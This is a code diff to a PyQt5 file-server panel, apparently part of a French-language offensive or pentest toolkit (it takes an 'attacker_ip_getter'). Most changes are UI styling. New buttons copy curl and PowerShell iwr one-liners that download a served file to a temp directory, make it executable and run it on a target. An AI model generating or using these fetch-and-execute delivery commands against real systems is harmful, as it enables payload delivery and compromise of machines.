@@ -19,7 +19,7 @@ import tempfile
 from pathlib import Path
 from typing import Optional
 
-from PyQt5.QtCore import Qt, pyqtSignal
+from PyQt5.QtCore import Qt, QTimer, pyqtSignal
 from PyQt5.QtGui import QDragEnterEvent, QDropEvent
 from PyQt5.QtWidgets import (
     QAbstractItemView, QApplication, QFileDialog, QHBoxLayout,
@@ -57,6 +57,9 @@ class FileServerPanel(QWidget):
         super().__init__(parent)
         self._fs = file_servers
         self._get_ip = attacker_ip_getter
+        self._pulse_on = False
+        self.setObjectName("fileServerPanel")
+        self._install_local_style()
 
         # Serving dir
         SERVING_DIR.mkdir(parents=True, exist_ok=True)
@@ -81,8 +84,13 @@ class FileServerPanel(QWidget):
         ctrl_row.addWidget(self._port_spin)
 
         self._btn_start = SafeButton("Demarrer")
+        self._btn_start.setObjectName("fsStart")
         self._btn_start.clicked.connect(self._on_start_stop)
         ctrl_row.addWidget(self._btn_start)
+
+        self._status_dot = QLabel()
+        self._status_dot.setFixedSize(12, 12)
+        ctrl_row.addWidget(self._status_dot)
 
         self._status_lbl = QLabel("[-] serveur arrete")
         self._status_lbl.setStyleSheet("color:#9e9e9e;")
@@ -124,19 +132,33 @@ class FileServerPanel(QWidget):
         self._table.setContextMenuPolicy(Qt.CustomContextMenu)
         self._table.customContextMenuRequested.connect(self._on_context_menu)
         self._table.cellDoubleClicked.connect(self._on_copy_url)
+        self._table.itemSelectionChanged.connect(self._sync_snippet_buttons)
         root.addWidget(self._table, 1)
 
         # Actions
         actions = QHBoxLayout()
         btn_add = SafeButton("+ Ajouter fichier")
+        btn_add.setObjectName("fsAdd")
         btn_add.clicked.connect(self._on_add_file)
         actions.addWidget(btn_add)
 
         btn_open_dir = SafeButton("Ouvrir dossier")
+        btn_open_dir.setObjectName("fsOpen")
         btn_open_dir.clicked.connect(self._open_serving_dir)
         actions.addWidget(btn_open_dir)
 
+        self._btn_copy_curl = SafeButton("Copier curl")
+        self._btn_copy_curl.setObjectName("fsSnippet")
+        self._btn_copy_curl.clicked.connect(lambda: self._copy_selected_snippet("curl"))
+        actions.addWidget(self._btn_copy_curl)
+
+        self._btn_copy_iwr = SafeButton("Copier iwr")
+        self._btn_copy_iwr.setObjectName("fsSnippet")
+        self._btn_copy_iwr.clicked.connect(lambda: self._copy_selected_snippet("iwr"))
+        actions.addWidget(self._btn_copy_iwr)
+
         btn_clear = SafeButton("Tout effacer")
+        btn_clear.setObjectName("fsDanger")
         btn_clear.clicked.connect(self._on_clear_all)
         actions.addWidget(btn_clear)
 
@@ -148,6 +170,13 @@ class FileServerPanel(QWidget):
 
         # Connect fileservers signals
         self._fs.shares_changed.connect(self._refresh_status)
+        self._sync_snippet_buttons()
+        self._refresh_status()
+
+        self._pulse_timer = QTimer(self)
+        self._pulse_timer.setInterval(650)
+        self._pulse_timer.timeout.connect(self._pulse_status)
+        self._pulse_timer.start()
 
     # -- Drag & drop ---------------------------------------------------------
 
@@ -167,9 +196,11 @@ class FileServerPanel(QWidget):
         super().dragLeaveEvent(event)
 
     def _reset_drop_style(self) -> None:
+        color = "#2f6b45" if self._current_share else "#444"
+        bg = "#17231c" if self._current_share else "#1a1a1a"
         self._drop_zone.setStyleSheet(
-            "QLabel { background:#1a1a1a; border:2px dashed #444; "
-            "border-radius:6px; padding:18px; }"
+            f"QLabel {{ background:{bg}; border:2px dashed {color}; "
+            "border-radius:6px; padding:18px; }}"
         )
 
     def dropEvent(self, event: QDropEvent) -> None:
@@ -263,6 +294,9 @@ class FileServerPanel(QWidget):
             share = self._fs.start_http(str(SERVING_DIR), port=port)
             self._current_share = share
             self._btn_start.setText("Arreter")
+            self._btn_start.setObjectName("fsStop")
+            self._btn_start.style().unpolish(self._btn_start)
+            self._btn_start.style().polish(self._btn_start)
             self._refresh_status()
             self._refresh_table()
         except Exception as exc:
@@ -276,6 +310,9 @@ class FileServerPanel(QWidget):
         finally:
             self._current_share = None
             self._btn_start.setText("Demarrer")
+            self._btn_start.setObjectName("fsStart")
+            self._btn_start.style().unpolish(self._btn_start)
+            self._btn_start.style().polish(self._btn_start)
             self._refresh_status()
             self._refresh_table()
 
@@ -290,6 +327,8 @@ class FileServerPanel(QWidget):
         else:
             self._status_lbl.setText("[-] serveur arrete")
             self._status_lbl.setStyleSheet("color:#9e9e9e;")
+        self._reset_drop_style()
+        self._pulse_status()
 
     # -- Table ---------------------------------------------------------------
 
@@ -310,7 +349,7 @@ class FileServerPanel(QWidget):
     def _on_copy_url(self, row: int, _col: int) -> None:
         url_item = self._table.item(row, 2)
         if url_item:
-            QApplication.clipboard().setText(url_item.text())
+            self._copy_text(url_item.text())
 
     def _on_context_menu(self, point) -> None:
         row = self._table.rowAt(point.y())
@@ -334,19 +373,80 @@ class FileServerPanel(QWidget):
         url = url_item.text() if url_item else ""
 
         if chosen is act_copy:
-            QApplication.clipboard().setText(url)
+            self._copy_text(url)
         elif chosen is act_iwr:
             snippet = f'iwr {url} -OutFile C:\\Windows\\Temp\\{name}; C:\\Windows\\Temp\\{name}'
-            QApplication.clipboard().setText(snippet)
+            self._copy_text(snippet)
         elif chosen is act_curl:
             snippet = f'curl {url} -o /tmp/{name} && chmod +x /tmp/{name} && /tmp/{name}'
-            QApplication.clipboard().setText(snippet)
+            self._copy_text(snippet)
         elif chosen is act_delete:
             try:
                 (SERVING_DIR / name).unlink()
                 self._refresh_table()
+                self._sync_snippet_buttons()
             except OSError as exc:
                 QMessageBox.warning(self, "Erreur", str(exc))
+
+    def _selected_row(self) -> int:
+        rows = sorted({idx.row() for idx in self._table.selectedIndexes()})
+        return rows[0] if rows else -1
+
+    def _selected_file_url(self) -> tuple[str, str]:
+        row = self._selected_row()
+        if row < 0:
+            return "", ""
+        name_item = self._table.item(row, 0)
+        url_item = self._table.item(row, 2)
+        return (
+            name_item.text() if name_item else "",
+            url_item.text() if url_item else "",
+        )
+
+    def _sync_snippet_buttons(self) -> None:
+        enabled = self._selected_row() >= 0
+        self._btn_copy_curl.setEnabled(enabled)
+        self._btn_copy_iwr.setEnabled(enabled)
+
+    def _copy_selected_snippet(self, kind: str) -> None:
+        name, url = self._selected_file_url()
+        if not name or not url:
+            return
+        if kind == "iwr":
+            text = f'iwr {url} -OutFile C:\\Windows\\Temp\\{name}; C:\\Windows\\Temp\\{name}'
+        else:
+            text = f'curl -fL {url} -o /tmp/{name} && chmod +x /tmp/{name} && /tmp/{name}'
+        self._copy_text(text)
+
+    def _copy_text(self, text: str) -> None:
+        QApplication.clipboard().setText(text)
+        self._flash_status("Copie dans le presse-papier", "#4fc3f7")
+
+    def _flash_status(self, text: str, color: str) -> None:
+        old_text = self._status_lbl.text()
+        old_style = self._status_lbl.styleSheet()
+        self._status_lbl.setText(text)
+        self._status_lbl.setStyleSheet(f"color:{color}; font-weight:bold;")
+        QTimer.singleShot(1200, lambda: self._restore_status(old_text, old_style))
+
+    def _restore_status(self, text: str, style: str) -> None:
+        if "Copie" in self._status_lbl.text():
+            self._status_lbl.setText(text)
+            self._status_lbl.setStyleSheet(style)
+
+    def _pulse_status(self) -> None:
+        if not hasattr(self, "_status_dot"):
+            return
+        if not self._current_share:
+            self._status_dot.setStyleSheet(
+                "background:#555; border-radius:6px; border:1px solid #333;"
+            )
+            return
+        self._pulse_on = not self._pulse_on
+        color = "#81c784" if self._pulse_on else "#2f6b45"
+        self._status_dot.setStyleSheet(
+            f"background:{color}; border-radius:6px; border:1px solid #b9f6ca;"
+        )
 
     def _open_serving_dir(self) -> None:
         # Subprocess detache pour eviter que le file manager pollue notre stderr
@@ -372,3 +472,33 @@ class FileServerPanel(QWidget):
         from PyQt5.QtCore import QUrl
         from PyQt5.QtGui import QDesktopServices
         QDesktopServices.openUrl(QUrl.fromLocalFile(str(SERVING_DIR)))
+
+    def _install_local_style(self) -> None:
+        self.setStyleSheet("""
+            QWidget#fileServerPanel QPushButton#fsStart {
+                background: #263b2c;
+                border-color: #81c784;
+                color: #dff5e3;
+                font-weight: bold;
+            }
+            QWidget#fileServerPanel QPushButton#fsStop {
+                background: #3b2626;
+                border-color: #ef5350;
+                color: #ffdddd;
+                font-weight: bold;
+            }
+            QWidget#fileServerPanel QPushButton#fsAdd {
+                background: #2c4a5e;
+                border-color: #4fc3f7;
+                color: #ffffff;
+            }
+            QWidget#fileServerPanel QPushButton#fsSnippet {
+                background: #34343a;
+                border-color: #5a5a64;
+            }
+            QWidget#fileServerPanel QPushButton#fsDanger {
+                background: #3b2b23;
+                border-color: #ffb74d;
+                color: #ffe0b2;
+            }
+        """)
